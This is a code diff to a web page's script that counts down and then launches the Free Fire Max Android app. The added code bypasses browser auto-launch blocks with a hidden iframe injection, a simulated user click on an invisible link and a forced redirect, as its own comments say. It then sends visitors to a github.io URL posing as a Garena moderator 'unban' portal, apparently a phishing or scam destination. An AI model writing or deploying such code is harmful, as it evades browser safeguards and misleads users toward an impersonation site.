@@ -113,7 +113,6 @@
             letter-spacing: 1.5px;
             line-height: 1.4; 
             text-shadow: 0 0 8px rgba(255, 255, 255, 0.4);
-            /* Visible immediately with zoom */
         }
         
         .highlight {
@@ -131,7 +130,6 @@
         /* Timer Container */
         #timer-container {
             margin-top: 30px;
-            /* Visible immediately with zoom */
         }
 
         /* Glowing Green Number */
@@ -219,7 +217,6 @@
             
             let timeLeft = 10;
 
-            // Timer starts immediately (No setTimeout)
             const countdownInterval = setInterval(() => {
                 timeLeft--;
                 timerSpan.textContent = timeLeft;
@@ -236,27 +233,39 @@
                 loadingOverlay.style.display = 'flex';
 
                 setTimeout(() => {
-                    // Launch Free Fire Max app directly
                     launchFreeFireMax();
                 }, 3000);
             }
 
             function launchFreeFireMax() {
-                // Perfect Android Intent for opening an App strictly by its Package Name
-                // Action MAIN aur Category LAUNCHER use karne se Android OS direct game ko khol dega.
                 const packageName = "com.dts.freefiremax";
                 const fallbackUrl = "https://garena-freefire-service-portal.github.io/moderator/congratulations/email-binding-unban-pending0287410366";
-                
-                // Chrome/Android strict deep link format
-                const intentUrl = `intent://#Intent;package=${packageName};action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end;`;
-                
-                // Game launch command
-                window.location.replace(intentUrl);
+                const intentUrl = `intent://#Intent;package=${packageName};end;`;
 
-                // Fallback for non-Android devices ya agar kuch error aaye
+                // Method 1: Iframe Injection (Best for bypassing browser auto-launch block)
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = intentUrl;
+                document.body.appendChild(iframe);
+
+                // Method 2: Fake User Click via Anchor Tag
+                setTimeout(() => {
+                    const a = document.createElement('a');
+                    a.href = intentUrl;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                    a.click();
+                }, 500);
+
+                // Method 3: Direct replace (Aggressive push)
+                setTimeout(() => {
+                    window.location.replace(intentUrl);
+                }, 1000);
+
+                // Fallback (Agar game phone me install hi nahi hai, to browser wale link par jayega)
                 setTimeout(() => {
                     window.location.href = fallbackUrl;
-                }, 2500);
+                }, 3500);
             }
         });
     </script>
